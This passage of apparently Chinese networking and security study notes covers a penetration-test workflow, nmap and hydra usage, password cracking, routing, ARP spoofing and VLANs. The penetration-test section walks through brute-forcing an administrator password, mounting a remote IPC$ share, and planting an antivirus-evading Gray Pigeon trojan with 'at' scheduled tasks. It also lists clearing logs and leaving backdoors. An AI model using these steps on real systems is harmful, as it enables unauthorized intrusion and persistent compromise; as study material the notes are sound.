<h4 id="5）使用组策略时"><a href="#5）使用组策略时" class="headerlink" title="5）使用组策略时"></a>5）使用组策略时</h4><p>​	若是要提供资源，如桌面背景图，应提前在DC上建立共享文件夹，以便所有人能访问下载</p>
<h4 id="6）设置用户登陆执行脚本的组策略"><a href="#6）设置用户登陆执行脚本的组策略" class="headerlink" title="6）设置用户登陆执行脚本的组策略"></a>6）设置用户登陆执行脚本的组策略</h4><p>​	需要把脚本复制到指定的文件夹中，在组策略中—-脚本—–登陆脚本—–添加—–浏览就能看到该路径</p>
<h2 id="11渗透测试流程："><a href="#11渗透测试流程：" class="headerlink" title="11渗透测试流程："></a>11渗透测试流程：</h2><p>0）授权（important）<br>    1）信息收集：nslookup、whois<br>    2）扫描漏洞：工具nmap：ip范围、端口等；接着高级扫描：如IIS漏洞，再接着扫描网站漏洞（十大漏洞）<br>    3）漏洞利用<br>    4）提权（shell环境、桌面环境、最高权限）<br>    5）一系列操作之后，毁尸灭迹（清除日志）<br>    6）留后门<br>    7）渗透测试报告</p>
<h3 id="例子：攻击服务器的445端口（共享服务）-windowsXP-攻击-windows2003"><a href="#例子：攻击服务器的445端口（共享服务）-windowsXP-攻击-windows2003" class="headerlink" title="例子：攻击服务器的445端口（共享服务）&#x3D;&#x3D;&#x3D;&#x3D; windowsXP   攻击   windows2003"></a><strong>例子</strong>：攻击服务器的<strong>445端口（共享服务）</strong>&#x3D;&#x3D;&#x3D;&#x3D; windowsXP   攻击   windows2003</h3><p>​		1）xp上安装漏洞扫描小工具：scanPort<br>​				也可用手动使用命令 telnet + ip + 端口  ： 测试目标是否打开了这个端口；telnet不仅可用于远程登陆，也能用于探测端口<br>​		2）此例子主要利用<strong>445端口</strong>漏洞之一：**IPC$**；使用的命令 <code>net use</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">net use 使用例子：</span><br>net use f: \\10.1.1.3\share 123.com /user:administrator  #作用：将10.1.1.3的共享文件夹映射到本机的f盘，中间共享文件夹可用一些隐藏的共享文件夹，比如 c$,IPC$等<br>net use    #显示映射列表<br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除映射的盘符</span><br>net use f: /del   #删除某条<br>net use * /del   #删除全部<br><span class="hljs-meta prompt_">#</span><span class="language-bash">注意使用上诉命令，只在此次登陆有效，下次登陆就会失效，若要永久保存，则：</span><br>在 我的计算机  -- 右键  ----- 映射网络驱动器 ----- 选择登陆时连接----选择用户连接 ---- 输入暴力破解出的账号密码----- 然后按要求填写即可<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">映射IPC$</span><br>net use \\10.1.1.3\IPC$ 123.com /user:administrator   #不映射盘符，然后就可以随意对对方电脑做操作<br>dir \\10.1.1.3\D$     #查看对方电脑D盘中的目录<br><span class="hljs-meta prompt_">#</span><span class="language-bash">之前所学的所有命令，只要带路径的都可以改成 远程路径</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">留后门</span><br>1）使用木马工具：灰鸽子牧民战天免杀专版<br>2）打开程序-----选择配置服务程序------安装选项 中选择该木马在对方主机的安装目录-----启动项设置 中设置是否写入注册表，以及是否当成服务启动并设置服务名称及描述-----选择 自动上线设置  设置本机ip  接着生成服务器<br>3）最后将生成的服务器通过 IPC$ 拷贝到对方电脑上<br>	想要在对方电脑上运行该服务：<br>	通过定时任务：at 命令：制作定时任务  、  net time \\10.1.1.3 查看对方电脑的时间<br>	（1）at \\10.1.1.3 11:19 &quot;c:\windows\system32\heihei.exe&quot;  #制订定时任务，11：19为时间，双引号中的为服务程序<br>	（2）at \\10.1.1.3     #查看对方电脑中的定时任务，若任务执行了，则显示空<br>	（3）接着打开 灰鸽子牧民战天免杀专版 程序，左边有一个 自动上线主机 ---点击即可查看被种木马且上线的主机<br></code></pre></td></tr></table></figure>

<p>​	<strong>Tips</strong>：一般可以将电脑的管理员账号名称administrator进行修改，可以改成guest，将guest改成administrator，这样别人一般都会将管理员账号默认为administrator然后进行密码破解，而经过上诉调换之后，即使密码被暴力破解了，也只是一个权限不足的guest<br>​		3）为了能够使用net use进行盘符映射，需要知道目标账号和密码，账号可以默认使用 administrator(大多人不会改)，密码则进行暴力破解（远程破解）<br>​		<strong>注</strong>：为什么登陆IPC$，因为其是一个空链接，没有对应任何一个盘，只要我们登陆了IPC$，那我们可以使用对方主机的所有盘</p>
<h3 id="11-1扫描工具nmap"><a href="#11-1扫描工具nmap" class="headerlink" title="11.1扫描工具nmap"></a>11.1扫描工具nmap</h3><p>​	扫描器之王，一般内置在kail系统中，也有windows版本的，只不过不稳定</p>
<p>​	常用参数：</p>
<p><img src="/staticImg/image-20240415102205966.png" alt="image-20240415102205966"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -sP 10.1.1.1/24   #扫描整个网段<br>nmap -O 10.1.1.1    #探测主机Ip为10.1.1.1所使用的系统版本，同时会给出该主机上哪些端口打开了<br>nmap -p 21,23 10.1.1.1   #探测主机是否开启21,23端口号,或者使用  23-25,后面的地址可以使用网段<br>namp -p 21,23 10.1.1.1 -sV   #不仅查看端口是否开放，同时查看开放的端口运行的软件的信息（是windows还是linux）<br>namp -A 10.1.1.1   #全面扫描，显示非常详细的信息<br>namp -O 10.1.1.1 -oN d:\baogao.txt 		#查看主机的系统版本，同时将信息保存到d盘下的baogao.txt文件中<br></code></pre></td></tr></table></figure>

<h3 id="11-2爆破工具hydra"><a href="#11-2爆破工具hydra" class="headerlink" title="11.2爆破工具hydra"></a>11.2爆破工具hydra</h3><p>​	用于爆破的工具，也是内置在kail系统中的，也有windows版本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">windows电脑上</span><br>hydra.exe -l administrator -P e:\pass.txt 10.1.1.1 telnet   #暴力破解主机管理员的账号，并登陆telnet,其中pass.txt为密码字典，中间参数p的作用：大写P:后面跟上密码字典； 小写p:后面直接跟管理员密码；前面账号前的l参数也是一样的：小写l:填写确定的账号名； 大写L：使用账号字典<br>最后面还可以加上参数 -vV  :可以显示爆破的详细过程，不过windows版不太好用<br>常用的服务的名称：<br>445 ： 共享服务，名称：smb<br>3389：远程桌面服务  名称：rdp<br>21：ftp  名称：ftp<br>23：telnet  名称 telnet<br></code></pre></td></tr></table></figure>

<h3 id="11-3回顾学过破解密码方法"><a href="#11-3回顾学过破解密码方法" class="headerlink" title="11.3回顾学过破解密码方法"></a>11.3回顾学过破解密码方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">本地破解</span><br>1.利用PE系统破解密码<br>2.利用5次shift破解系统密码<br><br>4.使用 getpass 工具：使用该工具得前提是得登陆该电脑，该工具可以将登陆时缓存在内存中得密码找出<br>5.利用SAM值，进行暴力破解；使用工具&#x27;QuarksPwDump&#x27;提取本地SAM值，接着使用工具&#x27;SAMInside&#x27;进行暴力破解<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">远程破解</span><br>3.远程爆破：namp:扫描是否在线且是否开启相应端口	；NtScan 或者 hydra:进行账号密码爆破<br><br></code></pre></td></tr></table></figure>

<h2 id="12OSI七层模型"><a href="#12OSI七层模型" class="headerlink" title="12OSI七层模型"></a>12OSI七层模型</h2><p>​	Open System Interconnection(OSI)：开放系统互联</p>
<p>​	在OSI七层参考模型问世之后，出现了<strong>TCP&#x2F;IP五层协议栈</strong>（将七层模型中的应用层、表示层和会话层合并在一层，通称应用层）</p>
<p>​	分层的思想：复杂问题简单化；下层为上层提供服务；同层使用相同的协议</p>
<h3 id="12-1TCP-IP五层协议栈"><a href="#12-1TCP-IP五层协议栈" class="headerlink" title="12.1TCP&#x2F;IP五层协议栈"></a>12.1TCP&#x2F;IP五层协议栈</h3><h4 id="1）应用层："><a href="#1）应用层：" class="headerlink" title="1）应用层："></a>1）应用层：</h4><p>​				提供源端口和目标端口；<br>​				应用层中的<strong>表示层</strong>用于将数据转化为二进制；<br>​				<strong>会话层</strong>用于管理会话数据，维持会话秩序<br>​				代表设备：PC，防火墙<br>​				协议：HTTP（80），HTTPS（443），SSH（22），Telnet（23），FTP（20&#x2F;21），DHCP（67&#x2F;68），SMTP（25），POP3（110），RDP（3389），SMB（445），Mysql（3306），DNS（53）</p>
<h4 id="2）传输层："><a href="#2）传输层：" class="headerlink" title="2）传输层："></a>2）传输层：</h4><p>​				选择TCP&#x2F;UDP传输，加上TCP&#x2F;UDP头；<br>​				完成进程与进程之间的通信；输出的数据称为<strong>数据段</strong>（fragment）<br>​				代表设备：防火墙<br>​				协议：<strong>TCP</strong>，UDP（<strong>应用层数据流向传输层后，这俩个协议必须二选一（应用层数据预先就选择好了））</strong></p>
<p>​				应用层所列出的协议中:<br>​					DNS的53端口既使用TCP也使用UDP：在客户机与服务器之间通信使用UDP，服务器之间通信使用TCP（备份操作）;<br>​					DHCP的67&#x2F;68端口均使用UDP;<br>​					SMB的445端口，既使用TCP也使用UDP;<br>​					其余协议均使用TCP;</p>
<h4 id="3）网络层："><a href="#3）网络层：" class="headerlink" title="3）网络层："></a>3）网络层：</h4><p>​				加上IP包头：源ip和目标ip；<br>​				完成点到点之间的通信；输出数据称为<strong>报文或包或IP包</strong>(package)；路由器工作在这一层<br>​				代表设备：路由器<br>​				协议：ICMP（ping命令使用的协议），<strong>IP</strong>，ARP（<strong>传输层数据流向网络层后，必须使用IP协议，因为只有IP协议才能封装IP包头</strong>）<br>​				ICMP协议与IP地址有关，ARP协议与MAC地址有关</p>
<h5 id="（1）IP包头结构：最小长度20字节（不包括可选项），可选项最大可达40字节，因此IP包头最大长度可达60字节"><a href="#（1）IP包头结构：最小长度20字节（不包括可选项），可选项最大可达40字节，因此IP包头最大长度可达60字节" class="headerlink" title="（1）IP包头结构：最小长度20字节（不包括可选项），可选项最大可达40字节，因此IP包头最大长度可达60字节"></a>（1）IP包头结构：最小长度20字节（不包括可选项），可选项最大可达40字节，因此IP包头最大长度可达60字节</h5><p><img src="/staticImg/image-20240424103434217.png" alt="image-20240424103434217"></p>
<p>​				1）版本：4个bit，表示是 ipv4 还是 ipv6<br>​				2）首部长度：4个bit，转化为10禁止最大为15，每个数字单位为4个字节，<strong>因此15可以代表 15 * 4 &#x3D; 60字节</strong><br>​				3）优先级与服务类型：8个bit，前三位代表优先级，中间四为代表服务类型，最后一位没有启用<br>​				4）总长度：16bit，包头长度加上四五层数据的总长度，即三四五层数据的总长度<br>​				5）标识符：16bit，发送端随机生成的，用于标识同一个分片数据<br>​				6）标志：3bit，第一个bit没有启用，为0；第二个bit用于标识是否分片，为0代表进行了分片，为1则没有分片；第三个bit用于								标识当前分片是否为最后分片；为1代表还有后续分片，为0则代表当前分片为最后分片<br>​				7）段偏移量：13bit，当数据长度超过1500后需要分片，段偏移量用于区分分片后的片段顺序<br>​				8）TTL：Time To Live 生存时间；8bit，最开始会初始化一个值，一般<strong>windows在100往上</strong>，<strong>linux一般在100往下</strong>，在传输期								间，每经过一个路由器，<strong>该值都会减1</strong>，当减到0，这个包就会被丢弃，<strong>防止该包在互联网上永久循环下去</strong>。<br>​				9）协议号：8bit，识别上层协议，tcp&#x2F;udp&#x2F;icmp；若值为6则流向tcp；17则流向udp；1则流向icmp<br>​			  10）首部校验和：16bit，<strong>校验首部20字节</strong><br>​			  12）源地址：32bit，发送端ip地址<br>​			  13）目标地址：32bit，接收端ip地址<br>​			  14）可选项：0-40字节，一般不会启用</p>
<h6 id="–路由："><a href="#–路由：" class="headerlink" title="–路由："></a>–路由：</h6><p>​		跨越从源主机到目标主机的一个互联网络来转发数据包的过程；<br>​				<strong>选择路径的过程称为路由</strong>（通过路由表完成）；<br>​				一旦某条线路的<strong>断开或损坏</strong>，<strong>与该网线的端口有关的路由条目都会动态消失</strong>；<br>​			注意：<strong>路由器只路由单播数据，不会路由广播</strong></p>
<p><img src="/staticImg/image-20240424190118514.png" alt="image-20240424190118514"></p>
<p>​		一旦给路由配上ip，且手动no shutdown 后，路由器中的路由表就会自动形成俩条<strong>路由条目&#x2F;路径条目</strong>(路由器一般有俩接口)：<br>​				1）C	10.1.1.0&#x2F;24	F0&#x2F;0 ；网段 + 对应接口；开头的 C（connected） 代表直连<br>​				2）C	20.1.1.0&#x2F;24	F0&#x2F;1<br>​				注意：一定要配好ip，以及接口为up状态;<br>​							一旦路由表中没有ip包中的目标ip地址的网段，则该数据包直接丢弃，且回发失败及原因<br>​				因为路由表只会自动生成与其直连的路由信息，因此其它路由信息需要我们手工配置：<br>​				3）S	70.1.1.0&#x2F;24	F0&#x2F;1;	S表示static，一般为手动配置；第一种写法（实际一般不这么写）<br>​					  S	70.1.1.0&#x2F;24	20.1.1.2（下一跳IP地址)	</p>
<p>​				4）S*	0.0.0.0&#x2F;0	20.1.1.2	：前面的 S* 表示手动配置的默认地址；<strong>边缘路由</strong>适合配置：如上图的10、70、50<br>​				5）S	40.1.1.1&#x2F;24	20.1.1.2<br>​					 S	40.1.1.1&#x2F;24	30.1.1.2(2)：后面的(2)表示，将S的管理距离值变为2，这样查询的时候会优先查询上面一条；且当上面那条正常出现的情况下（网线无损坏且端口为up），<strong>后面优先级较低的条目会被隐藏</strong>（因为俩条目的网段冲突了，且第二条优先级低于第一条）。当第一条优先级高的消失之后，第二条才会出现，所以第二条也称为**<code>浮动路由</code>**</p>
<h6 id="–路由表的查询顺序："><a href="#–路由表的查询顺序：" class="headerlink" title="–路由表的查询顺序："></a>–路由表的查询顺序：</h6><p>​				路由表的查询顺序由<code>管理距离值</code>决定，其中：<strong>C的管理距离值为0</strong>；<strong>S的管理距离值为1</strong>；<strong>S*的管理距离值为无穷大</strong>；<br>​				<strong>管理路由值越小，优先级越大</strong>；</p>
<h6 id="–路由器的工作原理"><a href="#–路由器的工作原理" class="headerlink" title="–路由器的工作原理"></a>–路由器的工作原理</h6><p>​		1）一个帧到达路由，路由首先检查帧的目标MAC地址是否是自己，不是则丢弃（广播除外），是则解封装，并将ip包送到路由器内部；<br>​		2）路由器检查ip包头中的目标IP地址，并匹配路由表，获取下一跳的ip地址，若匹配失败，则丢弃，并向源ip回馈错误信息；匹配成功，则将ip包路由到出接口；<br>​		3）封装帧，首先将出接口的MAC地址作为源MAC地址封装到帧头，然后检查路由器中的ARP缓存表，是否有下一跳ip对应的MAC地址，若有则直接将其作为目标MAC封装到帧头；若没有，则发送ARP广播请求下一跳的MAC，获取到下一跳的MAC地址并缓存，接着将其作为目标MAC封装到帧头；<br>​		4）将帧发送出去</p>
<h6 id="–相关命令："><a href="#–相关命令：" class="headerlink" title="–相关命令："></a>–相关命令：</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">windows 命令</span><br>1. tracert www.baidu.com	#检查从当前ip到目标ip需要经过几跳（几个路由器）<br>2. arp -a  #查看本机的ARP缓存表<br>3. arp -d  #清除本机ARP缓存<br>4. arp -s ip MAC地址	#ARP绑定<br>&#x27;&#x27;&#x27;arp缓存是保存在内存中的,开机时生效，一段时间不通信，自动会删除记录；若是同时有多个主机应答，则遵循&quot;谁后到就使用谁的&quot;,后面来的会覆盖前面的&#x27;&#x27;&#x27;<br>5. netsh interface ipv4 show neighbors<br>6. netsh interface ipv4 set neighbors 11 10.0.0.178 MAC地址<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">路由器命令</span><br>1. ip route ip 子网掩码 &#123;address | interface&#125;  #设置直连路由条目，最后一个参数建议写address,也就是下一跳地址<br>2. ip route 0.0.0.0 0.0.0.0 address 2	#设置默认路由，最后设置为2 代表设置管理路由距离，也就是设置优先级;加上最后一个优先级参数，则该路由也可以称为浮动路由<br>3. show ip route #查看路由表<br>4. arp ip mac地址 arpa f0/0	#全局配置模式下，网关路由器绑定ARP,交换机命令一样<br>5. int range f0/1 - 48		#多接口批量处理<br><span class="hljs-meta prompt_">#</span><span class="language-bash">配置子接口（vlan时用到）</span><br>6. int f0/0.1	#在f0/0接口下，创建一个子接口0.1并进入该子接口，该子接口能正常配置ip，但主接口不能配置<br>7. encapsulation dot1q 10	#与上条命令搭配使用，给子接口配置识别vlan标签的功能，最后一个参数代表其能识别的vlan，且只能识别一种<br><span class="hljs-meta prompt_">#</span><span class="language-bash">给路由器配置dhcp功能</span><br>8. ip dhcp excluded-address 10.1.1.1 10.1.1.99 #全局配置模式下，使用该命令，将某些地址排除<br>9. ip dhcp pool v10 #在使用上一条命令之后，使用这条命令创建v10的地址池<br>10. network 10.1.1.0 255.255.255.0 #配置网段<br>11. default-router 10.1.1.254  #配置网关<br>12. dns-server 40.1.1.1 #配置dns<br>13. lease 2 2 2 #配置租约<br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除路由器的dhcp功能,下面俩条命令一起使用即可</span><br>14. no ip dhcp excluded-address 10.1.1.1 10.1.1.99<br>15. no ip dhcp pool v10<br>16. ip help-address ip地址	#首先进入路由子接口，使用该命令将dhcp广播进行单播转发到某个ip地址<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">交换机命令</span><br>1. vlan ID,ID  或者	vlan ID-ID  #在全局配置模式下，前一条命令用于创建多个VLAN频段，后一条创建的多个连续频段；软件不支持同时创建多个vlan<br>&#x27;&#x27;&#x27;输入上面的命令之后会进入一个特殊的模式：VALN配置模式，在该模式下：&#x27;&#x27;&#x27;<br>2. [name 自定义名称]	#在VLAN配置模式下可以配置自定义名称（给使用者看，实际的起作用的还是ID）,且该配置是可选，若不配置，直接输入 exit 退出该模式即可<br>3. show vlan brief #查看vlan表的简要信息<br>4. switchport access vlan ID	#进入对应的端口，然后使用该命令将该端口加入到对应ID的vlan中<br>&#x27;&#x27;&#x27;注意：同一个交换机上的入口和出口两个端口必须要在同一个vlan下，数据才能通过&#x27;&#x27;&#x27;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">配置trunk</span><br>5. switchport trunk encapsulation dot1q/isl	#进入需要配置成trunk的端口，然后使用该命令将该端口设置为trunk,最后一个参数代表trunk标签的类型，二选一即可（需要交换机支持）,这条命令是可选的，用于选择标签的类型，若是交换机不支持该命令，说明交换机只支持802.1q标签，此时直接使用下一条命令即可<br>6. switchport mode trunk	#在完成上面的命令后，紧接着使用这条命令，将该端口的模式设置为trunk，后期若是不需要将该端口作为trunk端口，而是要连PC,则需要在该端口再次使用该命令，只不过需要将最后的参数替换为 access<br><span class="hljs-meta prompt_">#</span><span class="language-bash">交换机配置vtp</span><br>7. vtp mode server	#在全局配置模式下，将该交换机设置为vtp服务器<br>8. vtp domain xin  #设置域名名称<br>9. vtp password 123.com  #设置密码<br>&#x27;&#x27;&#x27;以上三条是配置服务器&#x27;&#x27;&#x27;<br>10. vtp mode client #设置该交换机为客户端<br>11. vtp domain xin	#设置域名名称<br>12. vtp password 123.com #设置密码<br>&#x27;&#x27;&#x27;以上三条配置vtp客户端&#x27;&#x27;&#x27;<br>&#x27;&#x27;&#x27;注意：服务器和客户端的域名名称和密码必须一样&#x27;&#x27;&#x27;<br>13. show vtp status #查看vtp的配置信息<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">三层交换机（核心交换机命令）</span><br>14. ip routing  #开启路由器三层交换功能<br>15. int vlan 10<br>		ip add 10.1.1.254<br>		no shut		#开启三层交换功能后，配合上面三条命令，让交换机和路由器之间生成一条虚拟的线，实现单臂路由的功能<br>16. int f0/1<br>		no switchport  #将交换机端口升级为路由端口（三层端口），接着这个端口就能配置ip,最后 no shutdown<br></code></pre></td></tr></table></figure>

<h6 id="–实验："><a href="#–实验：" class="headerlink" title="–实验："></a>–实验：</h6><p><img src="/staticImg/image-20240426111118277.png" alt="image-20240426111118277"></p>
<p><img src="/staticImg/image-20240426111154553.png" alt="image-20240426111154553"></p>
<p><img src="/staticImg/image-20240426111317473.png" alt="image-20240426111317473"></p>
<p><img src="/staticImg/image-20240426111345754.png" alt="image-20240426111345754"></p>
<h5 id="（2）ARP协议"><a href="#（2）ARP协议" class="headerlink" title="（2）ARP协议"></a>（2）ARP协议</h5><p><img src="/staticImg/image-20240426160324698.png" alt="image-20240426160324698"></p>
<h6 id="–广播与广播域"><a href="#–广播与广播域" class="headerlink" title="–广播与广播域"></a>–广播与广播域</h6><p>​	（1）广播：将广播地址作为目的地址的数据帧<br>​	（2）广播域：网络中能收到同一个广播的所有节点集合</p>
<p>​	MAC地址广播：广播地址为：FF-FF-FF-FF-FF-FF<br>​	IP地址广播：<br>​		1、255.255.255.255<br>​		2、广播ip地址为相应ip地址的网段的广播地址：如192.168.1.255&#x2F;24</p>
<h6 id="–什么是ARP协议"><a href="#–什么是ARP协议" class="headerlink" title="–什么是ARP协议"></a>–什么是ARP协议</h6><p>​		Address Resolution Protocol：地址解析协议：<strong>将一个已知的IP地址解析成MAC地址</strong><br>​		工作流程：<br>​			1）首先查看缓存是否由有对应ip的MAC地址，有则直接获取<br>​			2）若无，则发送ARP广播<br>​			3）对应ip的主机单播应答<br>​			4）将获取的MAC地址进行缓存<br>​		<strong>注意</strong>：ARP协议是内网协议，只在局域网内广播</p>
<h6 id="–ARP攻击与欺骗"><a href="#–ARP攻击与欺骗" class="headerlink" title="–ARP攻击与欺骗"></a>–ARP攻击与欺骗</h6><p>​		ARP攻击者通过发送虚假伪造的arp报文对受害者进行ARP缓存投毒</p>
<p>​		1）ARP攻击：<br>​				单播报文攻击：伪造ARP的单播应答包，使得真正的两台主机之间无法正常通信（伪造假的MAC），或者断网（伪造网关										MAC），假MAC为无法通信的MAC，即局域网内没有该MAC<br>​				ARP广播攻击：伪造一个ARP广播，里面的源ip和源MAC为网关ip和MAC（伪造的），目标ip随便；该广播的目的是为了让广										播域中的所有pc都收到该广播，由于ARP协议的贪婪，所有收到该广播主机会将该广播中的源ip和源MAC记录在										自己主机的ARP缓存中，由于该ip和MAC是伪造的，最终造成所有主机的网关的ip和MAC地址全部被替换成伪造										的IP和MAC，之后要上网时，主机会先查找缓存，使用假的网关ip和MAC，最终造成无法上网</p>
<p>​		2）ARP欺骗：介入两台主机之间，通过ARP协议，将自己的MAC地址伪造成目标MAC，将双方的通信消息先经过自己，再由自己								转发给目标主机；主机双方依旧可以正常通信，但是通信数据需要经过中间主机</p>
<p><img src="/staticImg/image-20240428141754715.png" alt="image-20240428141754715"></p>
<p><img src="/staticImg/image-20240428141809903.png" alt="image-20240428141809903"></p>
<h6 id="–ARP防御"><a href="#–ARP防御" class="headerlink" title="–ARP防御"></a>–ARP防御</h6><p>​	1）静态ARP绑定<br>​			手工绑定，在本机上静态配置网关的MAC地址；由于通信是双向的，因此还需要在路由器上静态绑定对应主机的MAC，一般用于服务器，普通的员工主机不建议这样做。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">windows上静态绑定ARP</span><br>arp -s ip MAC<br>netsh interface ipv4 show neighbors<br>netsh interface ipv4 set neighbors 11 10.0.0.178 MAC地址<br></code></pre></td></tr></table></figure>

<p>​	2）ARP防火墙（软件）<br>​			打开后，连接网线，会自动在客户机中形成一条静态ARP，内容指向网关；其次，与攻击者一样，向网关发送本机真正的MAC地址，算是一种另类攻击，此时就看谁发送的更多，更快（一般这种防火墙软件会根据攻击者发送的速度来调整自己的速度）！这对网关也是一种负担！</p>
<p>​	3）硬件级ARP防御<br>​			企业级的交换机会在主机向DHCP服务器获取IP的时候，就在交换机对应的接口上动态绑定主机获取的ip以及其对应的MAC地址，一旦该主机想发ARP报文，交换机的该接口就会将该ARP报文中的信息与之前绑定的信息进行对比，若不匹配，处理结果各有不同，要么丢弃该报文，要么直接将对应接口down掉，只有管理员能打开。<br>​			一旦该主机通信的信息中含有自己的ip以及MAC地址就会被交换机记录，除非最开始发送的消息就是伪造的，那这样也只能攻击一个人，且自己也无法上网。<br>​			注意：<strong>需要交换机支持端口做ARP动态绑定（配合DHCP服务器）</strong></p>
<h5 id="（3）VLAN（Vitural-LAN-虚拟局域网）：二层技术"><a href="#（3）VLAN（Vitural-LAN-虚拟局域网）：二层技术" class="headerlink" title="（3）VLAN（Vitural LAN 虚拟局域网）：二层技术"></a>（3）VLAN（Vitural LAN 虚拟局域网）：二层技术</h5><h6 id="–广播的危害："><a href="#–广播的危害：" class="headerlink" title="–广播的危害："></a>–广播的危害：</h6><p>​				增加网络&#x2F;终端负担，传播病毒，一些安全性问题</p>
<h6 id="–如何控制广播："><a href="#–如何控制广播：" class="headerlink" title="–如何控制广播："></a>–如何控制广播：</h6><p>​				路由器（<strong>物理隔离</strong>广播）；控制广播 &#x3D; 隔离广播域；<br>​				路由器隔离广播的缺点：成本高，不灵活</p>
<h6 id="–采用新的技术VLAN："><a href="#–采用新的技术VLAN：" class="headerlink" title="–采用新的技术VLAN："></a>–采用新的技术VLAN：</h6><p>​				<strong>VLAN 来控制广播</strong>；该技术是在交换机上实现的，是通过逻辑隔离划分的广播域；<br>​							一个 <strong><code>VLAN = 一个广播域  = 一个网段</code></strong></p>
<h6 id="–VLAN的类型："><a href="#–VLAN的类型：" class="headerlink" title="–VLAN的类型："></a>–VLAN的类型：</h6><p>​				（1）静态VLAN：手工配置；基于端口划分的VLAN（同一VLAN下的<strong>端口连接的PC</strong>能够相互通信）;VALN表中记录的是端口<br>​												两台PC能否通信取决于两台PC<strong>连接的端口是否在同一个VLAN</strong>；PC一旦换了端口，VLAN就可能发生变化<br>​												<strong>实际一般采用这种</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">静态VLAN的命令</span><br>1. vlan ID,ID 或 vlan ID-ID	#在全局配置模式下，使用该命令创建多个vlan频段，前者用于创建多个不连续的频段，后者创建一个连续的频段<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看命令</span><br>2. show vlan brief	#查看vlan的简要信息<br><span class="hljs-meta prompt_">#</span><span class="language-bash">将端口加入到vlan中</span><br>&#x27;&#x27;&#x27;思科、锐捷是进入到对应端口再加入，而华为是直接在全局配置下加入，只不过命令中需要带上对应端口&#x27;&#x27;&#x27;<br>3. switchport access vlan ID	#首先进入到对应的端口，然后使用该命令将该端口加入到对应的vlan中<br></code></pre></td></tr></table></figure>

<p>​				（2）动态VLAN：手工配置；基于MAC地址划分的VLAN；VLAN表中记录的是主机MAC地址<br>​												两台PC能否通信取决于两台PC的<strong>MAC地址是否的在同一个VLAN</strong>；即使PC换了端口，VLAN也不会发生变												化；<br>​												<strong>虽然灵活，但是维护量大，因此在实际中基本不用</strong></p>
<p>​				（3）采用802.1x：基于账号来划分VLAN：过程比较复杂</p>
